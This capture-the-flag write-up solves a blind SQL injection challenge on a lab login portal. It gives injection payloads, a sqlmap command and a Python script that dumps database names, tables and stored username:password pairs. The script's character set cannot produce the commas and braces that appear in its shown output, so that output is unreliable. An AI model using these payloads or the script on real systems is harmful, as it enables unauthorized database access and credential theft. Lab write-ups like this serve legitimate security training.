# Web Exploitation — Blind SQL Injection

**Category:** Web Exploitation

**Difficulty:** Medium

**Tools Used:** Burp Suite, SQLMap, custom Python scripts

**Key Learning:** Boolean-based blind injection when time-based is blocked

---

## Challenge Description

An authentication portal with a login form. No error messages returned on failed queries. Goal: extract the contents of the database without visible feedback.

---

## Reconnaissance

Started by testing the login form with basic payloads to observe behavior:

```
Username: admin'
Password: test
```

The page returned a generic "Invalid credentials" response regardless of input — no SQL errors visible, confirming blind injection.

Tested time-based injection to confirm SQLi was possible:

```sql
admin' AND SLEEP(5)--
```

The page delayed by 5 seconds, confirming the backend was MySQL and vulnerable to time-based blind injection.

---

## Initial Approach — Time-Based (Blocked)

Attempted to automate extraction using SQLMap with time-based technique:

```bash
sqlmap -u "http://target.ctf/login" \
  --data="username=admin&password=test" \
  --technique=T \
  --dbms=mysql \
  --level=3
```

The challenge introduced a WAF that blocked requests with delays over 2 seconds, making time-based extraction unreliable.

---

## Solution — Boolean-Based Blind Injection

Switched to boolean-based blind injection, which infers data by asking true/false questions via query responses.

**Concept:** If the injected condition is TRUE, the page behaves one way. If FALSE, it behaves another. By asking enough yes/no questions, you can extract any string character by character.

### Step 1 — Confirm Boolean Injection Works

```sql
' OR 1=1--    → "Welcome back" (true condition)
' OR 1=2--    → "Invalid credentials" (false condition)
```

Different responses confirmed boolean-based injection was viable.

### Step 2 — Extract Database Name

```sql
' OR SUBSTRING(database(),1,1)='a'--
' OR SUBSTRING(database(),1,1)='b'--
...
' OR SUBSTRING(database(),1,1)='c'--   → TRUE (Welcome back)
```

Repeated for each character position to build the full database name: `ctfdb`

### Step 3 — Custom Python Extraction Script

Automated the character-by-character extraction:

```python
import requests
import string

TARGET = "http://target.ctf/login"
CHARSET = string.ascii_lowercase + string.digits + "_"

def is_true(payload):
    data = {"username": payload, "password": "x"}
    resp = requests.post(TARGET, data=data)
    return "Welcome back" in resp.text

def extract_string(query, max_len=40):
    result = ""
    for i in range(1, max_len + 1):
        found = False
        for char in CHARSET:
            payload = f"' OR SUBSTRING(({query}),{i},1)='{char}'--"
            if is_true(payload):
                result += char
                print(f"[+] Position {i}: {char} → {result}")
                found = True
                break
        if not found:
            break  # End of string
    return result

# Extract database name
db_name = extract_string("SELECT database()")
print(f"\n[+] Database: {db_name}")

# Extract table names
tables = extract_string("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()")
print(f"[+] Tables: {tables}")

# Extract users table contents
users = extract_string("SELECT GROUP_CONCAT(username,':',password) FROM users")
print(f"[+] Users: {users}")
```

### Step 4 — Flag Extraction

Running the script against the `flags` table:

```
[+] Database: ctfdb
[+] Tables: users,flags,sessions
[+] Flag: CTF{bl1nd_sqli_n0_pr0bl3m_w1th_b00l3ans}
```

---

## Key Takeaways

- **Time-based blind SQLi** is detectable and blockable by WAFs — always have a boolean-based fallback
- **Boolean-based extraction** is slower but stealthier and WAF-resistant
- Automating character extraction with Python dramatically speeds up the process
- Always check `information_schema` to map the full database structure before targeting specific tables

---

*[← Back to Writeups Index](../README.md)*
